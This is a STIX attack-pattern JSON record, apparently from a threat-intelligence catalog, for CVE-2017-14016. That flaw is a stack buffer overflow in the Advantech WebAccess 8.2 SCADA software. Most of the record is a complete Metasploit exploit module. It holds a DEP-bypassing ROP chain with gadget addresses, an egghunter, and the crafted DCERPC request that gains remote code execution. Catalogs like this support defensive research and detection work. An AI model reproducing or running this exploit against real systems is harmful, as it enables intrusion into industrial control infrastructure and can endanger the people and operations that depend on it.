{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--96034762-5fe1-47fb-abaf-9f808ecf04a4",
    "created": "2024-08-14T16:39:30.60964Z",
    "modified": "2024-08-14T16:39:30.609644Z",
    "name": "Advantech WebAccess Webvrpcs Service Opcode 80061 Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Advantech WebAccess 8.2. By sending a specially crafted DCERPC request, an attacker could overflow the buffer and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/advantech_webaccess_webvrpcs_bof.rb",
            "external_id": "advantech_webaccess_webvrpcs_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-14016"
        },
        {
            "source_name": "reference",
            "url": "https://ics-cert.us-cert.gov/advisories/ICSA-17-306-02"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Advantech WebAccess Webvrpcs Service Opcode 80061 Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Advantech WebAccess 8.2.\n          By sending a specially crafted DCERPC request, an attacker could overflow\n          the buffer and execute arbitrary code.\n      },\n      'Author'         => [ 'mr_me <mr_me[at]offensive-security[dot]com>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'ZDI', '17-938' ],\n          [ 'CVE', '2017-14016' ],\n          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-306-02' ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Windows 7 x86 - Advantech WebAccess 8.2-2017.03.31',\n            {\n              'Ret'   => 0x07036cdc,  # pop ebx; add esp, 994; retn 0x14\n              'Slide' => 0x07048f5b,  # retn\n              'Jmp'   => 0x0706067e   # pop ecx; pop ecx; ret 0x04\n            }\n          ],\n        ],\n      'DisclosureDate' => '2017-11-02',\n      'DefaultTarget'  => 0))\n    register_options([ Opt::RPORT(4592)])\n  end\n\n  def create_rop_chain()\n\n    # this target opts into dep\n    rop_gadgets =\n    [\n      0x020214c6,  # POP EAX # RETN [BwKrlAPI.dll]\n      0x0203a134,  # ptr to &VirtualAlloc() [IAT BwKrlAPI.dll]\n      0x02032fb4,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BwKrlAPI.dll]\n      0x070738ee,  # XCHG EAX,ESI # RETN [BwPAlarm.dll]\n      0x0201a646,  # POP EBP # RETN [BwKrlAPI.dll]\n      0x07024822,  # & push esp # ret  [BwPAlarm.dll]\n      0x070442dd,  # POP EAX # RETN [BwPAlarm.dll]\n      0xffffffff,  # Value to negate, will become 0x00000001\n      0x070467d2,  # NEG EAX # RETN [BwPAlarm.dll]\n      0x0704de61,  # PUSH EAX # ADD ESP,0C # POP EBX # RETN [BwPAlarm.dll]\n      rand_text_alpha(4).unpack('V'),\n      rand_text_alpha(4).unpack('V'),\n      rand_text_alpha(4).unpack('V'),\n      0x02030af7,  # POP EAX # RETN [BwKrlAPI.dll]\n      0xfbdbcbd5,  # put delta into eax (-> put 0x00001000 into edx)\n      0x02029003,  # ADD EAX,424442B # RETN [BwKrlAPI.dll]\n      0x0201234a,  # XCHG EAX,EDX # RETN [BwKrlAPI.dll]\n      0x07078df5,  # POP EAX # RETN [BwPAlarm.dll]\n      0xffffffc0,  # Value to negate, will become 0x00000040\n      0x070467d2,  # NEG EAX # RETN [BwPAlarm.dll]\n      0x07011e60,  # PUSH EAX # ADD AL,5B # POP ECX # RETN 0x08 [BwPAlarm.dll]\n      0x0706fe66,  # POP EDI # RETN [BwPAlarm.dll]\n      rand_text_alpha(4).unpack('V'),\n      rand_text_alpha(4).unpack('V'),\n      0x0703d825,  # RETN (ROP NOP) [BwPAlarm.dll]\n      0x0202ca65,  # POP EAX # RETN [BwKrlAPI.dll]\n      0x90909090,  # nop\n      0x07048f5a,  # PUSHAD # RETN [BwPAlarm.dll]\n    ].flatten.pack(\"V*\")\n    return rop_gadgets\n  end\n\n  def exploit\n    connect\n    handle = dcerpc_handle('5d2b62aa-ee0a-4a95-91ae-b064fdb471fc', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    # send the request to get the handle\n    resp   = dcerpc.call(0x4, [0x02000000].pack('V'))\n    handle = resp.last(4).unpack('V').first\n    print_good(\"Got a handle: 0x%08x\" % handle)\n    egg_options = { :eggtag   => \"0day\" }\n    egghunter, egg = generate_egghunter(payload.encoded, payload_badchars, egg_options)\n\n    # apparently this is called a ret chain\n    overflow  = [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Jmp']].pack('V')\n    overflow << [target['Ret']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << [target['Slide']].pack('V')\n    overflow << create_rop_chain()\n    overflow << egghunter\n    overflow << egg\n    overflow << rand_text_alpha(0x1000-overflow.length)\n\n    # sorry but I dont like msf's ndr class.\n    sploit  = [handle].pack('V')\n    sploit << [0x000138bd].pack('V')  # opcode we are attacking\n    sploit << [0x00001000].pack('V')  # size to copy\n    sploit << [0x00001000].pack('V')  # size of string\n    sploit << overflow\n    print_status(\"Trying target #{target.name}...\")\n    begin\n        dcerpc_call(0x1, sploit)\n        rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n    ensure\n        disconnect\n    end\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-11-02",
    "x_mitre_platforms": [
        "win'"
    ]
}